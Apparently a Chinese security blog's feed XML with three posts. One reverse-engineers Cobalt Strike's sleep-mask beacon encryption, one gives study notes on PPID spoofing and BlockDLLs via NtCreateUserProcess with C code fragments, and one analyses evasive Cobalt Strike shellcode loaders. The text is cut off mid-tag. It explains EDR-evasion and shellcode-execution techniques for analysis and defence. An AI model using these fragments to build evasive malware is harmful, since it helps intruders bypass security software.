alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们首先需要跳过这部分。然后在0x00300000处下访问断点，运行后断在0x003383D8处，显然可以看到依次将抹去了MZ的PE头和节区数据复制到新的区域。<br>    <img src="http://hacky.wang/blog/20220701/FVYcv0WI8gWY.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/zHwSy8zPAEO8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后在新的beacon的地址，也就是0x00550000处下访问断点。然后运行，此时中断在0x00575533。因为经过多次调试，图片的断点已经不相符了。显然，beacon被加密之后，进行休眠。<br>    <img src="http://hacky.wang/blog/20220701/lczxvdQ8Hgop.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/20nPQGS63FvV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当休眠结束之后，将加密的beacon还原。然后通过交叉引用，将主要执行这一操作的函数定位到DllMain函数的Sub_591391_OptionalFunc的Sub_594267_SleepMask函数。<br>    <img src="http://hacky.wang/blog/20220701/zKzpOaWPRmpu.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/eopl9f75azjc.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/M9Tdct8e00WF.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/L2GNxc5i7K40.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Sub_8C9728_GetValueInC2Profile函数中，首先根据C2Profile的配置信息在偏移为0x29个元素的地方，取的值，如果取到的值为空的话，说明不需要加密，则直接Sleep，否则的话，进入Sub_8C4262_EncodeBeacon。<br>    <img src="http://hacky.wang/blog/20220701/qxd5A3PEzrRT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/I82xKiEDi8oL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sub_8C4262_EncodeBeacon在经过jmp后，首先，获取10004262h和10004262h的差值，因为从进程中dump出来的beacon的符号信息不完整，我们重新生成beacon.bin文件，查看这部分信息。很显然，sub_10004262和sub_100041D5函数是连续的，其本质就是为了获取sub_100041D5函数地址。<br>    <img src="http://hacky.wang/blog/20220701/m4U7kD1b6abT.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/GxmbUhcc6qh6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后通过C2Profile获取.text段末尾的偏移地址，并将100041D5h的数据复制到.text段段尾。在重新生成的beacon.bin中查看100041D5h的内容。很显然其实就是一个加密函数。整个加密逻辑和上面其实是能对应上的。<br>    <img src="http://hacky.wang/blog/20220701/4H56nqEEFBXG.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/D3Lhw45jbKFh.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/TGUkB1VIbkWJ.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着逻辑就很简单了，申请一个长度为0x10的Buffer，然后偏移为0x00的地方存储BaseAddress，在+0x04的地方存储获取的那些节区的地址，最后在偏移为0x08的地方保存生成的Key。将加密函数EncodeFunc和保存上述信息的结构体放到两个全局变量中，就可以在函数外面使用了。<br>    <img src="http://hacky.wang/blog/20220701/1Reaf5xVRncS.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220701/W4JnHbI5uqtj.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将EncodeFunc下硬件执行断点，断下。整体逻辑大概就是这样的，首先去DataStruct的地址，这是一对地址(起始地址和结束地址)，分别取了地址之后，进行判空，以及起始地址要小于结束地址，然后去BaseAddress，因为DataStruct存储的是偏移地址，加上基地址才是各个区段的绝对地址。然后进行加密运算。当加密完成之后，执行Sleep操作，休眠完，在解密相关数据段即可。<br>    <img src="http://hacky.wang/blog/20220701/MmfhGPJg9vCN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总结一下，CobaltStrike通过获取Section的起始地址和结束地址，并获取.text的结束地址，并将加密函数复制到.text的结束地址到rdata段之间空的地方，因为这个地方不会被加密。该加密函数内部会调用Sleep进行休眠，在休眠之前，加密数据，在休眠之后解密数据，以此往复，实现Sleep_Mask的功能。不得不说，设计的非常巧妙。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="https://xz.aliyun.com/t/9224?page=1" target="_blank" rel="external">记一次cs bypass卡巴斯基内存查杀</a></li><li><a href="https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#malleable-pe-process-injection-and-post-exploitationbeacon-hang-wei" target="_blank" rel="external">https://wbglil.gitbook.io/cobalt-strike/cobalt-strikekuo-zhan/malleable-c2#malleable-pe-process-injection-and-post-exploitationbeacon-hang-wei</a></li><li><a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/reference.profile#L254-L255" target="_blank" rel="external">https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/reference.profile#L254-L255</a></li><li>CobaltStrike4.0用户手册_中文翻译</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文转载于跳跳糖安全社区，原文链接为&lt;a href=&quot;https://tttang.com/archive/1662/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1662/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="攻防对抗" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>绿盟科技-每周蓝军技术推送（2022.5.14-5.20）学习</title>
    <link href="https://findream.github.io/2022/05/29/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81(2022.5.14-5.20)/"/>
    <id>https://findream.github.io/2022/05/29/绿盟科技-每周蓝军技术推送(2022.5.14-5.20)/</id>
    <published>2022-05-29T06:02:11.000Z</published>
    <updated>2022-06-14T13:10:09.303Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-每周蓝军技术推送（2022-5-14-5-20）"><a href="#0x00-每周蓝军技术推送（2022-5-14-5-20）" class="headerlink" title="0x00 每周蓝军技术推送（2022.5.14-5.20）"></a>0x00 每周蓝军技术推送（2022.5.14-5.20）</h2><ul><li>这一周的推送，主要学习了三部分内容：</li><li>篡改注册表与ETW，隐匿执行计划任务</li><li>使用NtCreateUserProcess进行PPID欺骗 和BlockDLL</li><li>Windows环境下的自保护探究<a id="more"></a></li></ul><h2 id="0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess"><a href="#0x01-PPID-Spoofing-amp-BlockDLLs-with-NtCreateUserProcess" class="headerlink" title="0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess"></a>0x01 PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</h2><ul><li><p>在<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">这篇文章中</a>，作者介绍了如何使用<code>NtCreateUserProcess</code>这一个未被官方文档化的API函数，NtCreateUserProcess函数是CreateProcessA(W)的底层实现。可以规避部分EDR的检测。</p></li><li><p>作者的灵感来源是来自Capt. Meelo的<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a>一文，NtCreateUserProcess的函数原型如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NTSTATUS</div><div class="line">NTAPI</div><div class="line">NtCreateUserProcess(</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ProcessHandle,</div><div class="line">    <span class="variable">_Out_</span> PHANDLE ThreadHandle,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ProcessDesiredAccess,</div><div class="line">    <span class="variable">_In_</span> ACCESS_MASK ThreadDesiredAccess,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ProcessObjectAttributes,</div><div class="line">    <span class="variable">_In_opt_</span> POBJECT_ATTRIBUTES ThreadObjectAttributes,</div><div class="line">    <span class="variable">_In_</span> ULONG ProcessFlags,</div><div class="line">    <span class="variable">_In_</span> ULONG ThreadFlags,</div><div class="line">    <span class="variable">_In_</span> PRTL_USER_PROCESS_PARAMETERS ProcessParameters,</div><div class="line">    <span class="variable">_Inout_</span> PPS_CREATE_INFO CreateInfo,</div><div class="line">    <span class="variable">_In_</span> PPS_ATTRIBUTE_LIST AttributeList</div><div class="line">);</div></pre></td></tr></table></figure></li><li><p><code>ProcessHandle</code>和<code>ThreadHandle</code>分别是需要传出的进程和线程句柄，可以为NULL。</p></li></ul><ul><li><p><code>ProcessDesiredAccess</code>和<code>ThreadDesiredAccess</code>是进程和线程访问权限掩码。可以直接为PROCESS_ALL_ACCESS和THREAD_ALL_ACCESS，具体可以参见以下文档,</p><ul><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" target="_blank" rel="external">进程安全和访问权限</a></li><li><a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights" target="_blank" rel="external">线程安全和访问权限</a></li></ul></li><li><p><code>ProcessObjectAttributes</code>和<code>ThreadObjectAttributes</code>是进程和线程对象属性，指向OBJECT_ATTRIBUTES结构，此处可以为<code>NULL</code></p></li><li><p><code>ProcessFlags</code>和<code>ThreadFlags</code>是进程线程标志，Meelo是查看ProcessHack源码获得的，此处可以为NULL</p></li><li><p><code>ProcessParameters</code>是进程参数信息，指向的是<code>RTL_USER_PROCESS_PARAMETERS</code>结构，通过逆向CreateProcessA函数，可以发现使用<code>RtlCreateProcessParametersEx</code>进行初始化</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="string">UNICODE_STRING</span> <span class="string">NtImagePath;</span></div><div class="line"><span class="string">RtlInitUnicodeString(&amp;NtImagePath,</span> <span class="string">(PWSTR)L"\\??\\C:\\Windows\\System32\\mmc.exe");</span></div><div class="line"><span class="string">PRTL_USER_PROCESS_PARAMETERS</span> <span class="string">ProcessParameters</span> <span class="string">=</span> <span class="literal">NULL</span><span class="string">;</span></div><div class="line"><span class="string">RtlCreateProcessParametersEx(&amp;ProcessParameters,</span> <span class="string">&amp;NtImagePath,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="literal">NULL</span><span class="string">,</span> <span class="string">RTL_USER_PROCESS_PARAMETERS_NORMALIZED);</span></div></pre></td></tr></table></figure></li><li><p>CreateInfo是一个指向<code>PS_CREATE_INFO</code>结构的指针，对于PS_CREATE_INFO结构的初始化也很简单。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// process create info</span></div><div class="line">PS_CREATE_INFO CreateInfo = &#123; <span class="number">0</span> &#125;;</div><div class="line">CreateInfo.Size = sizeof(CreateInfo);</div><div class="line">CreateInfo.State = PsCreateInitialState;</div></pre></td></tr></table></figure></li><li><p>最后一个参数是<code>AttributeList</code>，AttributeList指向的是PPS_ATTRIBUTE_LIST结构体，这是一个链表结构，可以通过RtlAllocateHeap函数自主申请链表的大小。在第一个节点中,必须要添加PS_ATTRIBUTE_IMAGE_NAME（进程映像名）这个属性。</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PS_ATTRIBUTE_LIST</span></span></div><div class="line"><span class="class"></span>&#123;</div><div class="line">SIZE_T TotalLength;                 <span class="comment">// sizeof(PS_ATTRIBUTE_LIST)</span></div><div class="line">PS_ATTRIBUTE Attributes[<span class="number">2</span>];         <span class="comment">// Depends on how many attribute entries should be supplied to NtCreateUserProcess</span></div><div class="line">&#125; PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;</div></pre></td></tr></table></figure></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// initialise attribute list</span></div><div class="line">PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE) * <span class="number">3</span>);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>TotalLength = sizeof(PS_ATTRIBUTE_LIST);</div><div class="line"><span class="comment">// set image name</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Attribute = PS_ATTRIBUTE_IMAGE_NAME;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Size = NtImagePath.Length;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">0</span>].Value = (ULONG_PTR)NtImagePath.Buffer;</div></pre></td></tr></table></figure><ul><li><p>作者在这篇文章中主要实现了两个功能，一个是PPID Spoofing，也就是父进程欺骗，另外一个是BlockDLLs，BlockDLLs简单的来说就是阻止一些非可信的DLL模块加载到进程中。</p></li><li><p>进程隐藏可以通过设置进程的Attribute即可，具体操作如下,将进程的PS_ATTRIBUTE_PARENT_PROCESS(父进程)属性设置为指定的父进程的Handle即可。：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// add parent process attribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].Size = sizeof(HANDLE);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">1</span>].ValuePtr = hParent;</div></pre></td></tr></table></figure></li><li><p>BlockDLLs允许系统根据不同的策略加载不同安全等级的Dll文件，因为一些安全软件会通过往进程中加载dll来进行行为监控，利用这个特性就可以阻止非windows的dll加载，包括安全软件的dll。<a href="https://paper.seebug.org/929/" target="_blank" rel="external">这里</a>可以看到完整的BlockDlls的介绍,主要有两种方法。</p><ul><li><p>通过<code>SetProcessMitigationPolicy</code>函数设置阻止策略。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY policy;</div><div class="line">policy.MitigationOptIn = 1;</div><div class="line">SetProcessMitigationPolicy(ProcessSignaturePolicy, &amp;policy, sizeof(policy))</div></pre></td></tr></table></figure></li><li><p>通过UpdateProcThreadAttribute修改线程属性。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">DWORD64 ProtectionLevel = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON<span class="comment">; //policy.MitigationOptIn</span></div><div class="line">UpdateProcThreadAttribute(<span class="name">si</span>.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, <span class="symbol">&amp;ProtectionLevel</span>, sizeof(<span class="name">ProtectionLevel</span>), NULL, NULL)</div></pre></td></tr></table></figure></li></ul></li></ul><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// blockdlls policy</span></div><div class="line">DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;</div><div class="line"><span class="comment">// add process mitigation atribute</span></div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].Size = sizeof(DWORD64);</div><div class="line">A<span class="function"><span class="title">ttributeList</span>-&gt;</span>Attributes[<span class="number">2</span>].ValuePtr = &amp;policy;</div></pre></td></tr></table></figure><ul><li><p>Ref:<a href="https://offensivedefence.co.uk/posts/ntcreateuserprocess/" target="_blank" rel="external">PPID Spoofing &amp; BlockDLLs with NtCreateUserProcess</a></p></li><li><p>Ref:<a href="[https://paper.seebug.org/929/](https://paper.seebug.org/929/">关于 CS 的 Blockdll 实现的个人 POC</a>)</p></li><li><p>Ref:<a href="https://captmeelo.com/redteam/maldev/2022/05/10/ntcreateuserprocess.html" target="_blank" rel="external">Making NtCreateUserProcess Work</a></p></li><li><p>Ref:<a href="https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp" target="_blank" rel="external">https://github.com/capt-meelo/NtCreateUserProcess/blob/master/main.cpp</a></p></li></ul><h2 id="0x02-Windows环境下的自保护探究"><a href="#0x02-Windows环境下的自保护探究" class="headerlink" title="0x02 Windows环境下的自保护探究"></a>0x02 Windows环境下的自保护探究</h2><ul><li>这篇文章作者的思路是这样的，在kill 杀软进程的时候，会使用OpenProcess打开杀软进程，在OPenProcessAPI函数底层呢，会调用ObRegisterCallbacks注册回调函数，所以作者的目的就是通过注册回调函数，首先判断当前进程ID是否是杀软自身的PID，如果是的话，则去除Kill进程的权限。<figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O<span class="function"><span class="title">perationInformation</span>-&gt;</span>P<span class="function"><span class="title">arameters</span>-&gt;</span>CreateHandleInformation.DesiredAccess &amp;= ~PROCESS_TERMINATE;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-每周蓝军技术推送（2022-5-14-5-20）&quot;&gt;&lt;a href=&quot;#0x00-每周蓝军技术推送（2022-5-14-5-20）&quot; class=&quot;headerlink&quot; title=&quot;0x00 每周蓝军技术推送（2022.5.14-5.20）&quot;&gt;&lt;/a&gt;0x00 每周蓝军技术推送（2022.5.14-5.20）&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;这一周的推送，主要学习了三部分内容：&lt;/li&gt;
&lt;li&gt;篡改注册表与ETW，隐匿执行计划任务&lt;/li&gt;
&lt;li&gt;使用NtCreateUserProcess进行PPID欺骗 和BlockDLL&lt;/li&gt;
&lt;li&gt;Windows环境下的自保护探究
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike高免杀样本分析</title>
    <link href="https://findream.github.io/2022/05/25/CobaltStrike%E9%AB%98%E5%85%8D%E6%9D%80%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/05/25/CobaltStrike高免杀样本分析/</id>
    <published>2022-05-25T06:02:11.000Z</published>
    <updated>2022-06-14T13:11:35.494Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;近期，在狩猎中，捕获到一批高度免杀的CobaltStrike样本，经过分析，目前这些免杀样本具备以下几种特征，第一，不在拘泥于传统的C++作为编程语言，也会采用C#或者Golang，或者脚本语言也会在整个攻击链中使用不同的语言，使用C++可能对使用者的要求有所提高，但是免杀效果可能更好。第二，对于shellcode的加密方式，不在拘泥于传统的异或或者AES，Base等公开的加密编码算法，也会采用一些好玩的，个性化的编码算法进行shellcode加密。第三，在开辟内存空间的时候，也不在使用传统的VirtualAlloc等R3层的API函数，更多的使用基于底层的API函数，第四，在调用shellcode过程中，也不像往常一样使用常规的方式调用shellcode，而是利用一些API的机制(CreateThread)，或者回调机制(EnumSystemLocalesW)，以及APC。<br><a id="more"></a></p><h2 id="0x01-Example1"><a href="#0x01-Example1" class="headerlink" title="0x01 Example1"></a>0x01 Example1</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个loader由C#编写，通过<code>powerShell.AddScript(@string);</code>加载加密过的Powershell脚本，然后通过<code>powerShell.BeginInvoke</code>执行。<br>   <img src="http://hacky.wang/blog/20220525/qaXTWKJGj3oG.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/igppaXzAbCFp.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第2层powershell脚本中，依旧是执行Base64加密/编码过的Powershell语句<br>   <img src="http://hacky.wang/blog/20220525/D2dzLkeJRY7N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过解码得到解码之后的Powershell脚本。第三层Powershell脚本逻辑也很清楚，首先解码一段base64，然后进行xor解密，获得一段shellcode，然后将解密获得的shellcode复制到内存中并执行。<br>   <img src="http://hacky.wang/blog/20220525/M1sraJ1PX2zv.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;经过分析，转储而来的shellcode是典型的cobaltstrike生成stageless类型的shellcode。也就是所谓的分离式免杀的操作。<br>   <img src="http://hacky.wang/blog/20220525/HlfthlTWfRdY.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/d87EH0lvK6Ee.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其本质还是一个download。其会加载winnet.dll模块，然后依次调用<code>wininet!InternetOpenA</code>,<code>wininet!InternetConnectA</code>,<code>KERNEL32!VirtualAllocStub</code>,<code>wininet!InternetReadFile</code>等网络读取函数读取服务端获取的payload。最终在栈顶保存的是读取的payload的地址，待到函数返回，执行流跳转到payload处。<br>   <img src="http://hacky.wang/blog/20220525/4X5BfKPs0xA7.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/yKFGpzN5ieTG.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以看到下载的bin主要有两部分组成，一个是引导shellcode，第二部分是payload，主要用来引导执行payload。这也是cobaltstrike特征之一。<br>   <img src="http://hacky.wang/blog/20220525/Ay4yTDOvlt4L.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，熟悉beacon的一眼就看到了cobaltstrike特征，这是beacon的PE文件，在默认生成的beacon文件中，这是导出的ReflectiveLoad函数，处理完PE数据之后，最终调用DllEntry函数进行后续的处理。<br>   <img src="http://hacky.wang/blog/20220525/iDDm7IHUMk2j.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220525/3LNMGFde8eGf.png?imageslim" alt="mark"></p><h2 id="0x02-Example2"><a href="#0x02-Example2" class="headerlink" title="0x02 Example2"></a>0x02 Example2</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://www.virustotal.com/gui/file/d0db40a4683de999dc11be3c8e5599363f21398a0a25c238dab1a680a2029d1f" target="_blank" rel="external">这个loader</a>使用GoLang编写，该样本并没有去除符号表，首先，检查系统的CPU个数和逻辑分区个数，如果CPU个数和逻辑分区个数小于4的话，则退出。<br>   <img src="http://hacky.wang/blog/20220528/hnHKiFkl7LGW.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用HeapCreate开辟内存空间，Golang编译的程序在汇编层面的函数调用方式和C++编译的有些许差异，在x64下，通过[eax]进行压栈传入参数，然后将需要调用的函数传入rax寄存器中，rcx保存的是参数的个数。并调用ZwAllocateVirtualMemory修改内存属性。<br>   <img src="http://hacky.wang/blog/20220528/qTyCrfDxjyGe.png?imageslim" alt="mark"><br>   <img src="http://hacky.wang/blog/20220528/4d9ddEWAr28n.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;16个字节组成的Byte[],如果需要将shellcode转化为UUID形式的话，如果shellcode长度不足16的话，将自动补齐。在CobaltStrike免杀样本中，UUID是以字符串形式存在于内存中，其通过API函数<code>UuidFromStringA</code>将其转化为UUID格式。<br>   <img src="http://hacky.wang/blog/20220528/hYXCzF2FThsV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，通过<code>EnumSystemLocalesW</code>函数通过回调的方式执行shellcode，同样的可以进行回调的还有以下函数<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>, EnumTimeFormatsA</div><div class="line"><span class="number">2</span>, EnumWindows</div><div class="line"><span class="number">3</span>, EnumDesktopWindows</div><div class="line"><span class="number">4</span>, EnumDateFormatsA</div><div class="line"><span class="number">5</span>, EnumChildWindows</div><div class="line"><span class="number">6</span>, EnumThreadWindows</div><div class="line"><span class="number">7</span>, EnumSystemLocales</div><div class="line"><span class="number">8</span>, EnumSystemGeoID</div><div class="line"><span class="number">9</span>, EnumSystemLanguageGroupsA</div><div class="line"><span class="number">10</span>, EnumUILanguagesA</div><div class="line"><span class="number">11</span>, EnumSystemCodePagesA</div><div class="line"><span class="number">12</span>, EnumDesktopsW</div><div class="line"><span class="number">13</span>, EnumSystemCodePagesW</div></pre></td></tr></table></figure></p><p>   <img src="http://hacky.wang/blog/20220528/181EYINyufLB.png?imageslim" alt="mark"></p><h2 id="0x03-Example3"><a href="#0x03-Example3" class="headerlink" title="0x03 Example3"></a>0x03 Example3</h2><ul><li><p>看图标和关键字显然，这是由<code>pyinstaller</code>打包而成的exe文件。目前常见的py打包工具主要有<code>pyinstaller</code>，<code>py2exe</code>,以及<code>cx_Freeze</code><br> <img src="http://hacky.wang/blog/20220530/eb0JbgWba5hY.png?imageslim" alt="mark"></p></li><li><p>针对<code>pyinstaller</code>打包而来的exe，可以使用<code>pyinstxtractor.py</code>进行解包，完成后，会在同目录生成一个extracted结尾的文件夹，在文件夹中，有两个没有后缀的文件，其中必然有一个名为struct文件。<br> <img src="http://hacky.wang/blog/20220530/6zXGpMBrmt4Q.png?imageslim" alt="mark"></p></li><li><p>那个名字为1的文件是一个抹去了时间戳和Magic的pyc文件，而抹去的信息可以在struct文件中找到，只需要复制<code>struct</code>文件的前16个字节复制到<code>1</code>这个文件中，即可。<br> <img src="http://hacky.wang/blog/20220530/oHHX0edBXdPT.png?imageslim" alt="mark"></p></li><li><p>然后使用在线的pyc2py的网站<a href="https://tool.lu/pyc/" target="_blank" rel="external">https://tool.lu/pyc/</a>就可以得到py代码如下。使用伪随机数解密，因为随机数种子是固定的，因为产生的随机数也是固定的。解密秘钥也就是固定的。loader是shellcode装载器，value是解密的shellcode。<br> <img src="http://hacky.wang/blog/20220530/BalqeFPTQs2s.png?imageslim" alt="mark"></p></li><li><p>loader代码如下，很常见的加载方式</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">shellcode = binascii.a2b_hex(value)</div><div class="line">ctypes<span class="selector-class">.windll</span><span class="selector-class">.kernel32</span><span class="selector-class">.VirtualAlloc</span><span 